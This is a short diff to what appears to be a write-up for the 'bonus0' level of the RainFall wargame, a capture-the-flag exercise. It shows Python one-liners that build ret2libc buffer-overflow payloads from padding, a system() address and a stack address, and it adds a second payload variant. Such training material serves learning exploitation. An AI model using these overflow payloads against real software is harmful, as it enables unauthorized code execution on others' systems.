@@ -21,3 +21,7 @@ $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 bonus0@RainFall:~$ python -c 'print "a\n" + "a" * 4096 + "\x60\xb0\xe6\xb7" + "ABCD" + "\x19\xf9\xff\xbf"' > /tmp/exploit
 bonus0@RainFall:~$ ./bonus0 < /tmp/exploit
 ```
+
+```
+python -c 'print "a" * 20 + "\n" + "aaaaa" + "\x60\xb0\xe6\xb7" + "ABCD" + "\x19\xf9\xff\xbf"' > /tmp/exploit
+```
